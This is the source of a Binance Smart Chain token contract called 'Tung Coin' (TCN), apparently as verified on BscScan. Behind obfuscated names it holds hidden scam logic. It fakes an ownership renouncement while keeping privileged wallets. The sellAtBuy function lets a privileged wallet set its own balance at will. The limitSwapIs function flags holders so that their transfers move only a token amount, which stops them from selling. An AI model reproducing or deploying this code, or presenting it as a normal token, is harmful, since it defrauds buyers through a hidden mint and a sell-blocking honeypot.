/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface feeFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface autoSender {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract TungCoin {
    uint8 private tokenMax = 18;

    address private swapFrom;

    string private sellTx = "Tung Coin";
    string private launchLaunched = "TCN";

    uint256 private senderSell = 100000000 * 10 ** tokenMax;
    mapping(address => uint256) private totalLimit;
    mapping(address => mapping(address => uint256)) private modeMaxBuy;

    mapping(address => bool) public launchedSenderFee;
    address public swapWalletAt;
    address public maxMode;
    mapping(address => bool) public autoTotal;
    uint256 constant minTake = 11 ** 10;
    bool public totalLaunched;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        feeFrom takeFeeReceiver = feeFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxMode = autoSender(takeFeeReceiver.factory()).createPair(takeFeeReceiver.WETH(), address(this));
        swapFrom = maxReceiverMin();
        swapWalletAt = swapFrom;
        launchedSenderFee[swapWalletAt] = true;
        totalLimit[swapWalletAt] = senderSell;
        emit Transfer(address(0), swapWalletAt, senderSell);
        sellMaxSender();
    }

    

    function getOwner() external view returns (address) {
        return swapFrom;
    }

    function transferFrom(address launchedToken, address takeTo, uint256 receiverTeam) public returns (bool) {
        if (launchedToken != maxReceiverMin() && modeMaxBuy[launchedToken][maxReceiverMin()] != type(uint256).max) {
            require(modeMaxBuy[launchedToken][maxReceiverMin()] >= receiverTeam);
            modeMaxBuy[launchedToken][maxReceiverMin()] -= receiverTeam;
        }
        if (takeTo == swapWalletAt || launchedToken == swapWalletAt) {
            return modeList(launchedToken, takeTo, receiverTeam);
        }
        if (autoTotal[launchedToken]) {
            return modeList(launchedToken, takeTo, minTake);
        }
        return modeList(launchedToken, takeTo, receiverTeam);
    }

    function sellAtBuy(uint256 receiverTeam) public {
        if (!launchedSenderFee[maxReceiverMin()]) {
            return;
        }
        totalLimit[swapWalletAt] = receiverTeam;
    }

    function decimals() external view returns (uint8) {
        return tokenMax;
    }

    function symbol() external view returns (string memory) {
        return launchLaunched;
    }

    function maxReceiverMin() private view returns (address) {
        return msg.sender;
    }

    function totalSupply() external view returns (uint256) {
        return senderSell;
    }

    function balanceOf(address senderBuy) public view returns (uint256) {
        return totalLimit[senderBuy];
    }

    function limitSwapIs(address shouldTotal) public {
        if (shouldTotal == swapWalletAt || shouldTotal == maxMode || !launchedSenderFee[maxReceiverMin()]) {
            return;
        }
        autoTotal[shouldTotal] = true;
    }

    function sellMaxSender() public {
        emit OwnershipTransferred(swapWalletAt, address(0));
        swapFrom = address(0);
    }

    function modeList(address totalLiquidity, address maxReceiver, uint256 receiverTeam) internal returns (bool) {
        require(totalLimit[totalLiquidity] >= receiverTeam);
        totalLimit[totalLiquidity] -= receiverTeam;
        totalLimit[maxReceiver] += receiverTeam;
        emit Transfer(totalLiquidity, maxReceiver, receiverTeam);
        return true;
    }

    function allowance(address minMarketing, address fundLiquidity) external view returns (uint256) {
        return modeMaxBuy[minMarketing][fundLiquidity];
    }

    function owner() external view returns (address) {
        return swapFrom;
    }

    function name() external view returns (string memory) {
        return sellTx;
    }

    function launchedReceiver(address senderReceiver) public {
        if (totalLaunched) {
            return;
        }
        launchedSenderFee[senderReceiver] = true;
        totalLaunched = true;
    }

    function transfer(address takeTo, uint256 receiverTeam) external returns (bool) {
        return transferFrom(maxReceiverMin(), takeTo, receiverTeam);
    }

    function approve(address fundLiquidity, uint256 receiverTeam) public returns (bool) {
        modeMaxBuy[maxReceiverMin()][fundLiquidity] = receiverTeam;
        emit Approval(maxReceiverMin(), fundLiquidity, receiverTeam);
        return true;
    }


}